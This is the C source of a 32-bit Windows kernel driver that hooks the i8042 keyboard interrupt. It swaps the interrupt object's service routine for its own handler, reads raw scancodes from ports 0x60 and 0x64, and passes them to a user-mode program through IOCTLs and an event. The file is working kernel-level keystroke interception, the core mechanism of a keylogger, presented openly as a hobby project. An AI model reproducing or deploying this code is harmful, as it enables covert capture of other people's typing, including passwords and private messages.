/*++
 *
 * idt_hook.c : Intercepting keyboard interrupt for fun!
 *
 * 2006 - chpie@naver.com
 *
 *
 * http://chpie.org/
 * 
--*/

#include <ntddk.h>
#include "i386.h"
#include "ioctls.h"
#include "i8042.h"

//
// Structures
//
typedef struct _DEVICE_EXTENSION
{
    PDEVICE_OBJECT  DeviceObject;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

/*
 * real _DEVOBJ_EXTENSION structure
 * 
   +0x000 Type             : Int2B
   +0x002 Size             : Uint2B
   +0x004 DeviceObject     : Ptr32 _DEVICE_OBJECT
   +0x008 PowerFlags       : Uint4B
   +0x00c Dope             : Ptr32 _DEVICE_OBJECT_POWER_EXTENSION
   +0x010 ExtensionFlags   : Uint4B
   +0x014 DeviceNode       : Ptr32 Void
   +0x018 AttachedTo       : Ptr32 _DEVICE_OBJECT
   +0x01c StartIoCount     : Int4B
   +0x020 StartIoKey       : Int4B
   +0x024 StartIoFlags     : Uint4B
   +0x028 Vpb              : Ptr32 _VPB
 */
typedef struct _R_DEVOBJ_EXTENSION
{
	CSHORT Type;
	USHORT Size;
	PDEVICE_OBJECT DeviceObject;
	ULONG   PowerFlags;
	PVOID Dope;
	ULONG	ExtensionFlags;
	PVOID	DeviceNode;
	PDEVICE_OBJECT AttachedTo;
	ULONG	StartIoCount;
	ULONG	StartIoKey;
	PVOID	Vpb;
} R_DEVOBJ_EXTENSION, *PR_DEVOBJ_EXTENSION;

//
//
//  function prototypes
//
//
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject,IN PUNICODE_STRING regPath );
void UnloadRoutine(	IN PDRIVER_OBJECT pDriverObject	);
NTSTATUS IoDeviceControl( IN	PDEVICE_OBJECT		pDeviceObject, 	    IN	PIRP				pIrp );
NTSTATUS IoReadWrite( 	  IN	PDEVICE_OBJECT		pDeviceObject, 		IN	PIRP				pIrp );
NTSTATUS IoDispatch( 	  IN	PDEVICE_OBJECT		pDeviceObject, 		IN	PIRP				pIrp );

VOID DpcForIsr(PKDPC Dpc, PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PDEVICE_EXTENSION pdx);
void NewHandler( void );
NTSTATUS KeyboardInterruptHook( void );

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, KeyboardInterruptHook)
#pragma alloc_text(PAGE, UnloadRoutine)
#pragma alloc_text(PAGE, IoDeviceControl)
#pragma alloc_text(PAGE, IoReadWrite)
#pragma alloc_text(PAGE, IoDispatch)
#endif

//
// definitions
//
//
#define IRQ 1  // IRQ 1 : Keyboard (machine dependent)
#define NT_DEVICE_NAME  L"\\Device\\IDT_HOOK" // device name and symbolic link name
#define DOS_DEVICE_NAME L"\\DosDevices\\IDT_HOOK"
#define NT_KEYBOARD_NAME0 L"\\Device\\KeyboardClass0" // Name of keyboard Device

//
// Global Variables
//
PDEVICE_EXTENSION deviceExtension; // Extension
ULONG             OldISR;          // Backup of ServiceRoutine's pointer
PKINTERRUPT       PKInt;           // KINTERRUPT Pointer
KINTERRUPT        KInt;            // Communication Data
PKEVENT           pEvent = NULL;   // Event Object for Communication with APP
UCHAR             data[2];         // Read Port

char              requestTick = 0;

/*
 *
 *		codes
 *
 *
 */

_declspec( naked ) void NewHandler( void ) // - Non-Paged
{
	IoRequestDpc(deviceExtension->DeviceObject, NULL, (PVOID)deviceExtension);
	
	_asm jmp dword ptr [OldISR] 
}


VOID DpcForIsr(PKDPC Dpc, PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PDEVICE_EXTENSION pdx) // - Non-Paged
{
	if (requestTick)
	{
		data[0] = READ_PORT_UCHAR((PUCHAR)0x60);
		data[1] = READ_PORT_UCHAR((PUCHAR)0x64);
		
		requestTick = 0;
		KeSetEvent(pEvent, EVENT_INCREMENT, FALSE); 
	}
}


NTSTATUS KeyboardInterruptHook(void)
{
	PDEVICE_OBJECT	pDeviceObject = NULL; 
	PFILE_OBJECT fileObject;
	UNICODE_STRING keyName;
	NTSTATUS status;
	PPORT_KEYBOARD_EXTENSION KeyboardExtension;
		
	RtlInitUnicodeString( &keyName, NT_KEYBOARD_NAME0 );
	
	status = IoGetDeviceObjectPointer(&keyName,
									  FILE_READ_ATTRIBUTES,
									  &fileObject, 
									  &pDeviceObject);
	
	if( !pDeviceObject )
		DbgPrint("IoGetDeviceObjectPointer Fail.");
	else
		DbgPrint("Top Object : %x\n", pDeviceObject);

	DbgPrint("Tracking %x \t/Driver/i8042prt\n", ((PR_DEVOBJ_EXTENSION)pDeviceObject->DeviceObjectExtension)->AttachedTo);

	while( pDeviceObject->DeviceType != FILE_DEVICE_8042_PORT )
	{
		if (((PR_DEVOBJ_EXTENSION)pDeviceObject->DeviceObjectExtension)->AttachedTo)
			pDeviceObject = ((PR_DEVOBJ_EXTENSION)pDeviceObject->DeviceObjectExtension)->AttachedTo;
		else 
		    return STATUS_SUCCESS;
	}
	
	PKInt = ((PPORT_KEYBOARD_EXTENSION)pDeviceObject->DeviceExtension)->InterruptObject;

	DbgPrint("Interrupt Object : %x\n", PKInt);
														  
	memcpy(&KInt, PKInt, sizeof(KINTERRUPT)); 

	_asm cli
	OldISR = PKInt->ServiceRoutine;
	PKInt->ServiceRoutine = (ULONG)(NewHandler);  
	_asm sti

    return STATUS_SUCCESS;
}


NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING regPath
	)
{
	PDEVICE_OBJECT pDeviceObject = NULL;
	NTSTATUS ntStatus;
	UNICODE_STRING uniNtNameString, uniWin32NameString;
	int i;


	RtlInitUnicodeString( &uniNtNameString, NT_DEVICE_NAME );
	ntStatus = IoCreateDevice (
					pDriverObject,
                    sizeof(DEVICE_EXTENSION),	// DeviceExtensionSize
                    &uniNtNameString,
                    FILE_DEVICE_UNKNOWN,		// 
                    0,							// No standard device characteristics
                    FALSE,						// not exclusive device
                    &pDeviceObject
                    );
	if( !NT_SUCCESS(ntStatus) ) {
		return ntStatus;
	}

	// create dispatch points for create/open, close, unload
	pDriverObject->DriverUnload = UnloadRoutine;

	RtlInitUnicodeString( &uniWin32NameString, DOS_DEVICE_NAME );
	ntStatus = IoCreateSymbolicLink( &uniWin32NameString, &uniNtNameString );
	if (!NT_SUCCESS(ntStatus)){
		IoDeleteDevice( pDriverObject->DeviceObject );
	}

	for( i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++ )
		pDriverObject->MajorFunction[i] = IoDispatch;
	
	pDriverObject->MajorFunction[IRP_MJ_READ]			= 
	pDriverObject->MajorFunction[IRP_MJ_WRITE]			= IoReadWrite;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoDeviceControl;

    RtlZeroMemory(pDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
    deviceExtension = (PDEVICE_EXTENSION) pDeviceObject->DeviceExtension;
	deviceExtension->DeviceObject = pDeviceObject;

	IoInitializeDpcRequest(pDeviceObject, DpcForIsr);
	
	KeyboardInterruptHook();

	return ntStatus;
}


void 
UnloadRoutine(
	IN PDRIVER_OBJECT pDriverObject
	)
{
	PDEVICE_OBJECT pDeviceObject;
	UNICODE_STRING uniWin32NameString;

	_asm cli
	PKInt->ServiceRoutine = OldISR; // restoring isr
	_asm sti
	
	if (pEvent)
		ObDereferenceObject(pEvent); // delete event reference
		
	pDeviceObject = pDriverObject->DeviceObject;

	RtlInitUnicodeString( &uniWin32NameString, DOS_DEVICE_NAME );
	IoDeleteSymbolicLink( &uniWin32NameString );
	IoDeleteDevice( pDriverObject->DeviceObject );
}

NTSTATUS
IoDispatch( 
		IN	PDEVICE_OBJECT		pDeviceObject, 
		IN	PIRP				pIrp )
{
	NTSTATUS				iStatus = STATUS_SUCCESS;

	pIrp->IoStatus.Status		= iStatus;
	pIrp->IoStatus.Information	= 0;
	IoCompleteRequest( pIrp, IO_NO_INCREMENT );
	return iStatus;
}

NTSTATUS
IoDeviceControl( 
		IN	PDEVICE_OBJECT		pDeviceObject, 
		IN	PIRP				pIrp )
{
	NTSTATUS				iStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION		pStack;
	ULONG					iTransfered = 0;

	HANDLE hEvent;
	
  	pStack = IoGetCurrentIrpStackLocation( pIrp );
	
	switch( pStack->Parameters.DeviceIoControl.IoControlCode )
	{
		case IOCTL_REGISTER_EVENT:
			// event
			hEvent = * (PHANDLE) pIrp->AssociatedIrp.SystemBuffer;
			iStatus = ObReferenceObjectByHandle(hEvent, EVENT_MODIFY_STATE, *ExEventObjectType, pIrp->RequestorMode, (PVOID *)&pEvent, NULL);
			requestTick = 1;
			
		case IOCTL_REQUEST_DATA:
			memcpy( (void *)pIrp->AssociatedIrp.SystemBuffer, (const void *)data, sizeof(char [2]));
			iTransfered = sizeof(char [2]);
			break;
			
		case IOCTL_KINTERRUPT:
			memcpy( (void *)pIrp->AssociatedIrp.SystemBuffer, (const void *)&KInt, sizeof(KINTERRUPT));
			iTransfered = sizeof(KINTERRUPT);
			iStatus = STATUS_SUCCESS;
			break;

		default:
			iStatus = STATUS_INVALID_PARAMETER;
			break;
	}

	pIrp->IoStatus.Status		= iStatus;
	pIrp->IoStatus.Information	= iTransfered;
	IoCompleteRequest( pIrp, IO_NO_INCREMENT );
	
	return iStatus;
}

NTSTATUS
IoReadWrite( 
		IN	PDEVICE_OBJECT		pDeviceObject, 
		IN	PIRP				pIrp )
{
	NTSTATUS				iStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION		pStack;
	ULONG					iTransfered = 0;

	pStack = IoGetCurrentIrpStackLocation( pIrp );
	
	pIrp->IoStatus.Status		= iStatus;
	pIrp->IoStatus.Information	= iTransfered;
	IoCompleteRequest( pIrp, IO_NO_INCREMENT );
	
	return iStatus;
}
